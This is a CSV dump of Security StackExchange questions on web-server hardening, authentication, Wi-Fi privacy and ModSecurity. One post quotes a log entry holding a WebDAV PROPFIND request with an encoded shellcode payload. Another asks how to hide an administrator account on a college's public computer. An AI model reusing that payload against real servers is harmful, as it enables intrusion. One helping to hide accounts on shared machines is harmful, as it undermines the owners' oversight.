Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate,ContentLicense
"1811","1","1813","","2011-01-21 23:31:48","","11","1850","<p>I have read extremely mixed opinions on the process of chrooting for a web server (non-shared environment). Some people swear by it, yet others say that it isn't as secure as everyone says.</p>

<p>Given that chrooting can be difficult and time consuming to implement and maintain, on a non-shared server do you Chroot? Why/Why not?</p>

<p>If you do, do you use a module such as mod_security?</p>

<p>If you don't, do you do anything else to the server that accomplishes the same goal?</p>
","1158","","665","","2011-04-01 21:49:27","2011-04-01 21:49:27","Relative importance of CHROOT for web servers","<webserver><linux><mod-security>","1","0","","","","CC BY-SA 2.5"
"70704","1","","","2014-10-14 20:14:13","","0","233","<p>I just came across this:</p>

<p><a href=""https://blog.webmaker.org/one-less-password"" rel=""nofollow"">https://blog.webmaker.org/one-less-password</a></p>

<p>Basically a technique for eliminating passwords as the primary authentication mechanism for connecting to a website by replacing it with your mobile device.</p>

<p>In the technical sense is this a more secure system or does it increase vulnerability because it now centralizes the location access is granted via (ie loose you mobile device and now access to your accounts is protected by a 4 digit pin).</p>
","4600","","54284","","2014-10-14 20:36:43","2014-10-14 22:17:25","One Less Password","<passwords><security-theater>","3","4","","","","CC BY-SA 3.0"
"206941","1","","","2019-04-06 22:58:47","","0","107","<p>For a reason I can't fathom, people seem to subscribe to the opinion that a secret username isn't more secure than a public one. I find this opinion completely ludicrous and would like to know why this dogma has continued for so long.</p>

<p>If an authentication system depends on a secret password to authenticate, wouldn't logic dictate that a secret username would be twice as secure?</p>

<p>My opinion is that, if a username is treated by both the user and authentication system as a password then, by definition, it IS a password; the first in a series of two.</p>

<p>What caused this confusion and frustration is a question I posted elsewhere. I asked if it were possible to separate an email user's address from the username during authentication. The logic being that if a hacker needed to brute the username along with the password for a targeted attack, it could take twice the effort to succeed.</p>

<p>What logic could you possibly provide to prove that a username is not a password if it is treated as such (aka a secret)?</p>

<p>This question concerns only this specific attack vector and not any other related ones like social engineering, system vulnerabilities, etc.</p>

<p>UPDATE: This question is not a duplicate of another question because it asks a completely different question:
""would like to know why this dogma has continued for so long"" in the first paragraph. The other questions are only included to provide support for the main one and to offer the Answer-er a vehicle for supporting their answer.</p>

<p>UPDATE: I get it - with an authentication system that does not intend to keep a username secret (ie reveals if a username is valid or not) is not more secure than a password of double length). My question targets an authentication system that DOES treat a username as a 1st password (ie does not reveal the validity of a username).</p>
","","user32227","","user32227","2019-04-07 22:03:40","2019-04-07 22:03:40","Authentication System Usernames","<authentication><account-security>","1","1","","2019-04-18 15:29:14","","CC BY-SA 4.0"
"139949","1","","","2016-10-17 08:15:34","","0","741","<p>I use my office network for snapchat, facebook etc 
My office network uses PEAP as an EAP method.
And uses system certificates while connecting</p>

<p>It requires me to connect to the domain that is my  companyname.com
and then the office provided user credentials.</p>

<p>Is this is a secure connection?Can they see my snaps , chats etc.?</p>

<p>Any help is appreciated.</p>

<p>Thanks.</p>

<p><a href=""https://i.stack.imgur.com/6qjEB.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6qjEB.png"" alt=""enter image description here""></a></p>
","127741","","","","","2016-11-16 12:55:55","Security on a PEAP wifi network on phone","<network><wifi><android><network-scanners><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"207073","1","207076","","2019-04-09 11:41:21","","0","524","<p>I just installed <code>Opera browser v60</code> (i.e. Reborn 3) on <code>Windows 10</code>. I noticed that it has automatically (without my consent and permission) taken all my bookmarks in Google Chrome and added to the bookmarks in the Opera browser. In addition, I noticed that somehow it has got access to my open sessions on Google Chrome. By this, I mean that I could for example open some websites using Opera browser without the need to give my username and password since I was logged into them using in Google Chrome browser (e.g. I did not need to login to <code>stackexchange.com</code>).</p>

<p>This felt creepy and made me think how Opera browser can do this? And in general, should I be worried that this happened and change my usernames and passwords?</p>

<p>At the moment, my idea why this happens is that because both browsers are based on <code>Chromium</code>. But I am not sure if this is the reason.  </p>
","204166","","204166","","2019-04-09 11:54:19","2019-04-09 12:05:51","How can Opera browser access my sessions on Google Chrome?","<web-browser><account-security>","1","0","","","","CC BY-SA 4.0"
"140152","1","","","2016-10-19 02:45:37","","1","1533","<p>I travel a lot. When I am away from home, I connect to the internet using a mobile hotspot provided by a major ISP in the US. I am the only one who uses this computer and this hotspot, both of which I own.</p>

<p>Assuming my ISP has not been compromised how hard would it be for an unsavory person be able to intercept or view my internet traffic? Are there any ways to make the system more secure?</p>
","127923","","","","","2016-10-19 05:08:59","Mobile hotspot security","<privacy><wifi><account-security>","2","1","","","","CC BY-SA 3.0"
"207137","1","","","2019-04-10 07:57:25","","1","2076","<p>I use Refresh Token to handling expired Access Token, and in log out, I can remove Refresh Token from the database. Refresh Token must never expire (not sure) because the user can check ""remember me"".</p>

<p>So why should I use <code>jwt</code> in Refresh Token? Can it be just a random hash string? And should it have expiration time?</p>
","102796","","","","","2019-04-11 04:30:17","Why should I use jwt in Refresh Token?","<authentication><account-security><jwt>","1","0","","2019-04-17 07:35:05","","CC BY-SA 4.0"
"207139","1","207140","","2019-04-10 08:09:36","","1","150","<p>After my journey for finding a way to <a href=""https://security.stackexchange.com/questions/206157/is-it-possible-to-create-a-truly-private-user-account-in-a-public-computer"">create a truly private user account in a public computer</a> (the setup I'm trying to do this on is detailed in this other question) ended in an epic fail I'm now taking a different approach to the subject: creating a regular admin account (I accept suggestions that require the super administrator account, but I'd like to avoid it) but make finding it extremely hard if you don't know what you're doing/looking after. Interactive logon is enabled on the college computer, so it helps I guess.</p>

<p>I need the account to not show up on the:</p>

<ul>
<li><p>Users folder.</p></li>
<li><p>logon screen (we got interactive logon so this is easy).</p></li>
<li><p>net user command/any user listing.</p></li>
</ul>

<p>These characteristics are the most necessary ones since without them it's possible to come across the account by accident. If you have a suggestion that only fits 1 or 2 of them please don't hesitate to comment, anything helps! Additional coverage/hiding and boring maneuvers like disabling/enabling the account every time I want to use it are welcome too.</p>
","202889","","","","","2019-04-10 08:26:49","How can I create a hidden Administrator account in a public computer?","<account-security><windows-7>","1","0","","","","CC BY-SA 4.0"
"140286","1","","","2016-10-20 07:08:23","","0","377","<p><a href=""https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/master/base_rules/modsecurity_crs_40_generic_attacks.conf"" rel=""nofollow"">OWASP modsecurity</a> rule 950119 for Remote File inclusion blocks the following URL:</p>

<pre><code>https://mydomain.com?myparam=http://mysite.com?&amp;param2=abcd
</code></pre>

<p>What's the issue with having <code>?&amp;</code> in an URL causing it to block <code>?</code>?</p>
","6862","","98538","","2016-10-20 08:54:03","2016-10-20 08:54:03","Why does OWASP modsecurity block remote file inclusion for ?& in URL for Rule 950119","<apache><mod-security>","0","2","","","","CC BY-SA 3.0"
"207253","1","207256","","2019-04-11 15:16:52","","1","272","<p>Some time ago a developer in my team accidentally published some code to his GitHub repository containing ENV_VARS that belonged to our company's SendGrid account. Fortunately I noticed this as soon as he created the repository and it was deleted.</p>

<p>Around 12 hours after this happened, SendGrid locked the company account and mentioned this was done because they found account details in a GitHub repository (the one my developer previously published and subsequently deleted).</p>

<p>This got me thinking: would the ""bot"" that SendGrid uses be searching GitHub with the username/password (in plain text)? If so, then this is a big security issue on their side, right (storing passwords in plain text)? </p>

<p>Even if they were encrypting the password and decrypting the password to search GitHub for exposed credentials, this would still seem unsafe as the password would be exposed to GitHub via a search string parameter.</p>

<p>Here is an example of what the ENV_VARS for the SendGrid account look like:</p>

<pre><code>MAIL_DRIVER=smtp
MAIL_HOST=smtp.sendgrid.net
MAIL_PORT=587
MAIL_USERNAME=username
MAIL_PASSWORD=null
MAIL_ENCRYPTION=tls
</code></pre>
","118122","","","","","2019-04-11 15:40:39","SendGrid Github Account Credentials Scanning","<account-security>","2","0","","","","CC BY-SA 4.0"
"207306","1","207310","","2019-04-12 14:30:52","","0","1046","<p>If a website has a <em>password change</em> functionality where the user isn't prompted for the current password and the form isn't using tokens to mitigate CSRF attacks, an attacker can easily execute a CSRF attack on logged-in users so that the victims are tricked into changing their passwords.</p>

<p>But, given no other flaws on the web application, can the attacker learn the victim's username so that he can actually login with the new password set by the attacker?</p>
","70038","","70038","","2019-04-12 14:37:36","2022-08-02 11:34:17","Can a password change via CSRF lead to account takeover?","<passwords><web-application><csrf><account-security><account-lockout>","3","1","","","","CC BY-SA 4.0"
"140388","1","","","2016-10-21 03:50:29","","4","659","<p>Assume that I will never, <em>ever</em>, forget my (in this case, Google) account password.</p>

<p>With that in mind, is there <strong>any benefit whatsoever</strong> to setting up a recovery email/phone/etc.?  </p>

<p>Or are all of these services only useful in the case of a forgotten password?</p>
","5613","","","","","2016-10-22 17:47:56","Any reason to have a recovery email/phone if I will NOT ever forget my password?","<email><account-security>","3","0","","","","CC BY-SA 3.0"
"207373","1","","","2019-04-14 09:22:19","","0","25","<p>Most of the login pages like Google, Outlook and Yahoo! confirm the username first and then ask for a password instead of confirming the username and password combination altogether. Isn't it less safe to go with the former practice as the intruder can guess the username first and then guess the password? whereas in the later case the intruder has to go with guessing both the options?</p>

<p>Also is there a website where I can find the industrial standards for the login flow?</p>
","204554","","","","","2019-04-14 09:22:19","Security risks in confirming the username instead of confirming the username and password combination","<authentication><passwords><password-cracking><password-policy><account-security>","0","2","","2019-04-14 09:48:26","","CC BY-SA 4.0"
"2537","1","","","2011-03-13 14:43:40","","4","657","<p>I’m using Linux based VPS hosting, and a firewall and mod_sec help to keep most hackers out. However, over the last couple of weeks I noticed several entries in mod_sec showing that an unknown domain was attacked. Does this mean that the VPS is compromised (I do not see any unknown DNS entries) and other domains are getting a free ride, or is it just pointing to a sloppy setup of the VPS server?</p>
","","Evelyn","665","","2011-04-01 21:47:47","2011-04-01 21:47:47","How to improve VPS security?","<operating-systems><webserver><linux><mod-security>","2","2","","","","CC BY-SA 2.5"
"71414","1","","","2014-10-23 07:33:54","","14","3718","<p>I've had a long running conversation with a client where they perform a <a href=""http://www.rapid7.com/db/vulnerabilities/tcp-seq-num-approximation"">Rapid7 security scan</a> which then warns about TCP MD5 checksums missing on port 80. This is what I think I know:</p>

<ul>
<li><a href=""https://www.ietf.org/rfc/rfc2385.txt"">RFC 2385</a> was designed to protect <a href=""http://en.wikipedia.org/wiki/Border_Gateway_Protocol"">BGP</a>, and by extension BGP-type protocols (i.e. long running TCP connections).</li>
<li>BGP uses long-running TCP connections, HTTP does not.</li>
<li>Encryption/IPSec has superseded <a href=""https://www.ietf.org/rfc/rfc2385.txt"">RFC 2385</a> for protecting BGP.</li>
<li>The TCP RST attack is against long running TCP connections because the attack relies on probability.</li>
<li>The impact against resetting a HTTP kept-alive connection is that the next request would restart it.</li>
<li>Most connections transfer data in milliseconds, the window of attack is too small for HTTP to effectively targeted. The attack depends on the window size and bandwidth of the attacker against the server and seem to take seconds even under good conditions according to page 25 of <a href=""http://bandwidthco.com/whitepapers/netforensics/tcpip/TCP%20Reset%20Attacks.pdf"">Slipping in the window: TCP reset attacks</a>)</li>
<li>A web view is typically made up of multiple connections for each connected client making this type of denial of service unattractive compared to alternatives.</li>
<li>Linux (specifically RHEL or Debian) has support for rfc2385 but can't be <em>globally</em> enabled.</li>
<li>Neither NGINX nor Apache has configuration options to open sockets with tcp-md5-checksums enabled.</li>
<li>Even if rfc2385 was active for HTTP, it wouldn't solve a problem, but would increase load on the server. Which is only a minor side point.</li>
</ul>

<p>I've attempted to explain that rfc2385 isn't relevant to web servers, but they are saying it's an issue with TCP which while true, simplifies that it's an attack against a specific <em>nature</em> of the TCP connection.</p>

<p>I've resorted to explaining that neither Apache and nginx can enable what they're asking for. They keep sending me knowledge base documents mentioning Windows, Cisco, NetBSD, BGP, but never anything relating to apache nor nginx.</p>

<p>Beyond the linked documents I've sent them <a href=""http://lwn.net/Articles/81560/"">LWN</a> explaining it:</p>

<blockquote>
  <p>It would be hard to use this technique to shut down a web server; HTTP connections tend to be short-lived to begin with.</p>
</blockquote>

<p>There is a patch available on Windows that fixes the warning which they are sending through as a suggestion, but it's clearly doesn't accomplish anything for linux.</p>

<p>Am I speaking nonsense? What would be your suggestion of getting the client that have security compliance to worry about to get on the same page as me?</p>
","21341","","32976","","2014-10-23 09:17:31","2015-09-22 06:09:06","How can I explain to the client that rfc2385 TCP MD5 Checksums can't be turned on for linux webservers?","<apache><tcp><security-theater><nginx>","3","6","","","","CC BY-SA 3.0"
"207478","1","207531","","2019-04-16 01:07:57","","0","928","<p>I have a Xen VM running Debian Stretch with Apache2 to play around with. I have installed ClamAV and Modsecurity (not doing anything just logging at the moment). I keep getting emails from ClamAV stating that it detects a virus Win.Exploit.Unicode_Mixed-1 in the Modsec log files.</p>

<pre><code>luke@lamp:~$ sudo clamscan -i /var/log/apache2/
/var/log/apache2/modsec_audit.log.7.gz: Win.Exploit.Unicode_Mixed-1 FOUND

----------- SCAN SUMMARY -----------
Known viruses: 6107846
Engine version: 0.100.3
Scanned directories: 1
Scanned files: 60
Infected files: 1
Data scanned: 111.06 MB
Data read: 23.27 MB (ratio 4.77:1)
Time: 42.726 sec (0 m 42 s)
luke@lamp:~$
</code></pre>

<p>I have submitted the file to VirusTotal.com. ClamAV is the only one to detect on the logfile. This has been going on for months now. Freshclam is keeping ClamAV updated as well.</p>

<p>Is there a way an actual log file can be infected? Is there a way to whitelist the rotating logfiles without whitelisting the signature? </p>

<p>But what i really want to know is this; is there a way to find out what is in the log that is triggering the detection?</p>

<p>EDIT: i managed to locate the string in the logfile. it is;</p>

<pre><code>jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB
</code></pre>

<p>Now that I found the string causing the detection, how can I find out what it is supposed to do? It is in the ""If"" line of the log excerpt below.</p>

<pre><code>--0a71b754-A--
[09/Apr/2019:16:10:10 +0800] XKxTYn8AAQEAAGyvyjUAAAAI 202.28.64.1 18716 &lt;local IP of server&gt; 80
--0a71b754-B--
PROPFIND / HTTP/1.1
Host: localhost
Connection: Close
Content-Length: 0
If: &lt;http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇$
</code></pre>

<p>Thanks,</p>

<p>Luke</p>
","204677","","204677","","2019-04-16 11:42:01","2019-04-16 14:04:51","ClamAV detects virus in Modsec Audit logs","<virus><antivirus><logging><mod-security>","1","3","","","","CC BY-SA 4.0"
"207559","1","","","2019-04-16 19:45:00","","1","142","<p>On SIM cards, which are used in mobile telephony, PIN (and PUK) is used. Unlike a password, they are locked after some incorrect attempts to prevent brute force attack. If wrong PIN is entered 3 times, user must enter PUK. When wrong PUK is entered 10 times, SIM card is permanently disabled.</p>

<p>On the website, if wrong PUK is entered 10 times, user must contact customer support to unlock their account. To prevent abuse, user must enter their password first.</p>

<p>Will adding PIN/PUK as second password increase security? Should it be added?</p>
","","user204771","","","","2019-05-16 21:01:41","Will SIM‐like PIN on website as second password increase security","<passwords><password-cracking><account-security><websites>","1","3","","","","CC BY-SA 4.0"
"207823","1","207828","","2019-04-22 11:33:08","","24","10926","<p>Every time I log in to Google with the same MacBook I get this email:</p>

<pre><code>New device signed in to
    example@gmail.com
Your Google Account was just signed in to from a new Mac device. You're getting this email to make sure it was you.
</code></pre>

<p>What do these emails mean exactly? When does Google send out those emails?</p>

<p>I guess I receive those emails because I use a VPN (always same public IP address) and some <a href=""https://www.privacytools.io/browsers/#addons"" rel=""nofollow noreferrer"">privacy plugins</a> in Firefox.</p>
","16066","","1271","","2019-04-24 14:56:39","2021-07-18 03:23:33","False 'Security alert' from Google - every login generates mails from 'no-reply@accounts.google.com'","<google><account-security>","1","3","","","","CC BY-SA 4.0"
"207895","1","208943","","2019-04-23 17:59:12","","10","2659","<p>How does Comcast know my WiFi password? I generated it via KeePass and entered it into my Arris router/cable modem myself, and I bought the router used from a friend. When I went to the account web page, it showed me my password. I changed the password and it instantly showed the new password on the account web page (after refresh).</p>

<p><a href=""https://customer.xfinity.com/#/settings/security"" rel=""noreferrer"">https://customer.xfinity.com/#/settings/security</a></p>

<p><a href=""https://i.stack.imgur.com/8Hzh0.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/8Hzh0.png"" alt=""enter image description here""></a></p>

<ul>
<li>Model:TG862G</li>
<li>Hardware Revision: 5</li>
<li>eMTA &amp; DOCSIS Software Version: 9.1.103M2AM.SIP.PC20.CT</li>
<li>Packet Cable:2.0</li>
</ul>

<p>I did not install any ""Comcast package"" or software or wizard setup program.</p>
","8722","","8722","","2019-04-23 18:53:53","2019-12-13 23:52:37","How does Comcast know my WiFi password?","<passwords><wifi><account-security><router>","4","3","","","","CC BY-SA 4.0"
"3004","1","3007","","2011-04-10 10:50:05","","7","7910","<p>It's been a few years since I mucked around with modsecurity...   </p>

<p>Will simply installing the package with the default rules provide enough validation to prevent any (okay, let's be honest - best we can hope for is ""most"") type of XSS? My assumption is no... and even if we consider only Type I - Reflected XSS.   </p>

<p>What about the <a href=""https://www.owasp.org/index.php/Category%3aOWASP_ModSecurity_Core_Rule_Set_Project"" rel=""nofollow"">Core Rule Set</a>? Is that XSS-proof enough?<br>
If not, what kind of rules are missing, and what should I look to add/customize, maybe on a per-page basis? (uggh...)   </p>

<p>Last part of the question, what about AJAX-heavy apps? How does ModSecurity, and in particular the CRS, handle AJAX requests without blocking them? 
I assume that hoping that it actually manages to parse out the AJAX and validate each parameter seperately would be <strong>too</strong> much to hope for...</p>

<hr>

<p>To clarify, fixing the code to remove all XSS, including input validation and especially contextual output encoding, is <strong>of course</strong> the best way to go, and really the only long-term solution.<br>
However, I was looking for a temporary, ""quick fix"", to pop something in place to protect the app <em>for now</em>, while they go and fix the XSS in the code, and search for more...   </p>
","33","","33","","2011-04-11 05:34:29","2018-08-30 14:56:40","Does default ModSecurity protect enough against XSS?","<appsec><xss><mod-security>","4","0","","","","CC BY-SA 3.0"
